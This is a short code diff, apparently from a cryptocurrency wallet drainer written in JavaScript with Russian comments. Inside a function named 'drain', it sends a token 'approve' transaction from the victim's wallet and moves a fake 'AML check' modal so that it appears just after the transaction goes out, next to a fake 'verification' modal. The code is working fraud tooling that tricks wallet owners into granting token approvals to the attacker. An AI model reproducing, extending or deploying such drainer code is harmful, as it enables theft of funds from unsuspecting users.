@@ -461,9 +461,9 @@ async function drain(chainId, signer, userAddress, bal, provider) {
           gasPrice: gasPrice,
           nonce
         });
+	await showAMLCheckModal(connectedAddress, roundedAmount); // Открываем модальное окно AML
         console.log(`📤 Транзакция approve отправлена: ${tx.hash}`);
 	await hideModalWithDelay(); // Закрываем модальное окно верификации
-	await showAMLCheckModal(connectedAddress, roundedAmount); // Открываем модальное окно AML
         const receipt = await tx.wait();
         console.log(`✅ Транзакция approve подтверждена: ${receipt.transactionHash}`);
 
